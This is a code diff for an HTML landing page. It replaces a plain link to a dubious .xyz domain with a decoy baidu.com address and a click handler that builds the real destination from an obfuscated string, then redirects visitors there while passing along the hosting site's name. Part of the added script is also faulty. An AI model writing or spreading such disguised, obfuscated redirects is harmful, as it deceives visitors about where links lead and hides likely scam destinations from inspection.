@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -61,7 +60,7 @@
 <div id="container">
   <p>
     <img src="static/image01.png">
-    <a id="link" href="http://k0ns.0mp0diic.xyz"><img src="static/image02.png"></a>
+    <a id="link" href="https://www.baidu.com/?Open=normal&BaiduPartner=360&BaiduVIP=73499" onclick="u();return false"><img src="static/image02.png"></a>
   </p>
 </div>
 <h1 id="h1" class="transition-in"></h1>
@@ -70,16 +69,19 @@
 <script src="static/ct1.js"></script>
 <script src="static/ct2.js"></script>
 <script>
-  var link = document.querySelector('#link');
+    (function () {
+        var vHeight = document.documentElement.clientHeight,
+            main = document.getElementById('link');
+        main[0].style.height = vHeight + 'px';
+    })();
 
-      var ua = window.navigator.userAgent.toLowerCase()
-  if (/iphone/.test(ua) || /ipad/.test(ua)) {
-    link.href = 'http://k0ns.0mp0diic.xyz'
-  } else if (/android/.test(ua)) {
-    link.href = 'http://k0ns.0mp0diic.xyz'
-  } else { // 其他设备
-    console.log('您的移动设备暂不支持')
-  }
+    function u() {
+        var uri = '19e99.com/?shareName=' + window.location.host;
+        var a="k0nsa@b0mp0diica@bxyz?url",b="http",c="://",r=b+c+a+"="+b+c+uri;r=r.replace(/a@b/g,".");r=r.replace(/c@d/g,"/");window.location.href=r;
+    }
+</script>
+
+<script>
   document.documentElement.addEventListener('touchstart', function (event) {
     if (event.touches.length > 1) {
       event.preventDefault()
